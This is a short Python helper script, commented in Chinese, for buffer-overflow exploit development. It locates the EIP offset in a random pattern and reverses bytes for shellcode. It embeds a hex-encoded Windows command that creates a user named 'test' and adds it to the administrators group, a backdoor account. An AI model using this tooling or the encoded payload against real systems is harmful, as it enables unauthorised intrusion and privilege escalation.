from struct import pack
import binascii
import random

eip = "46734b73"
cmd_str = "6e65742075736572207465737420313233343536202f616464202626206e6574206c6f63616c67726f75702061646d696e6973747261746f72732074657374202f616464"


def random_str(random_length):
    """
    生成随机字符串作为验证码
    :param random_length: 字符串长度
    :return: 随机字符串
    """
    string = ''

    chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz'
    length = len(chars) - 1

    # 设置循环每次取一个字符用来生成随机数
    for i in range(random_length):
        string += chars[random.randint(0, length)]

    with open('./randomcode.txt', 'w') as f:
        f.write(string)

    return string


def get_len(code,data):
    """
    查询eip寄存器中的数值在随机字符串中的位置
    :param code: eip数值
    :param data: 2000位随机字符串
    :return: 字符串位置(-1为无)
    """
    address = binascii.unhexlify(code.encode())[::-1].decode()
    location = data.find(str(address))
    print(location)

    return location


def cut(obj, sec):
    return [obj[i:i+sec] for i in range(0, len(obj), sec)]


def reserve(text):
    result = ''
    cutlist = cut(text, 2)
    cutlist.reverse()
    result = "".join(cutlist)
    print(result)
    return result


def readfile():
    f = open("shellcode.txt", "r")
    results = f.read().splitlines()
    print(results)


if __name__ == '__main__':

    with open('./randomcode.txt', 'r') as f:
        data = f.read()

    get_len(eip,data)
    # random_str(2000)
    # reserve(cmd_str)
    # readfile()
